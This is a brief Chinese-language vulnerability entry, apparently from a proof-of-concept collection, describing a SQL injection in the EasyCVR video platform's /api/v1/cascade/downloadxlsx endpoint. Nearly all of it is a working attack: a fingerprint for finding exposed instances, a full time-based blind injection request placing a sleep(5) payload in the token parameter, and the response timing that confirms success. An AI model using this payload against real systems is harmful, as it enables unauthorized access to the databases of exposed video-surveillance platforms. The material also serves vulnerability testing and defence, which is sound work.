# EasyCVR视频管理平台downloadxlsx存在SQL注入漏洞

EasyCVR ｜ SQL注入 ｜ —
- **指纹**：`body="EasyGBS"`
- **请求**：`GET /api/v1/cascade/downloadxlsx?token='and(select*from(select/**/sleep(5))a/**/union/**/select+1)=' HTTP/1.1`
- **响应特征**：401 响应时间>=5s